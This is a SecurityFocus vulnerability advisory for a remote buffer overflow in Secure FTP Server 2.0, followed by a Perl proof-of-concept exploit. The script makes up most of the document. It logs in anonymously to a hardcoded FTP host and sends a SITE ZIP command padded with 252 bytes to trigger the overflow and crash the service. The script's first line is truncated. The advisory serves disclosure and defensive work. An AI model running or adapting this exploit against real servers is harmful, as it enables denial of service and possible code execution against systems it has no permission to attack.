source: http://www.securityfocus.com/bid/9904/info

It has been reported that Secure FTP Server may be prone to a remote buffer overflow vulnerability that may allow attackers to execute arbitrary code on a vulnerable system in order to gain unauthorized access. An attacker may cause the buffer overflow condition to occur by sending about 252 bytes of data via a parameter of the SITE Command. Immediate consequences of an attack may result in a denial of service condition. The possibility of remote code execution has not been confirmed at the moment.

Secure FTP Server version 2.0 Build 03.11.2004.2 has been reported to prone to this issue.

e IO::Socket;

$host = "192.168.1.243";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "2117");

unless ($remote) { die "cannot connect to ftp daemon on $host" }

print "connected\n";
while (<$remote>)
{
 print $_;
 if (/220 /)
 {
  last;
 }
}

$remote->autoflush(1);

my $ftp = "USER anonymous\r\n";

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/331 /)
 {
  last;
 }
}

$ftp = join("", "PASS ", "a\@b.com", "\r\n");
print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/230 /)
 {
  last;
 }
}

$ftp = join ("", "SITE ZIP /d:", "A"x(252), "\r\n");

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/250 Done/)
 {
  last;
 }
}

close $remote;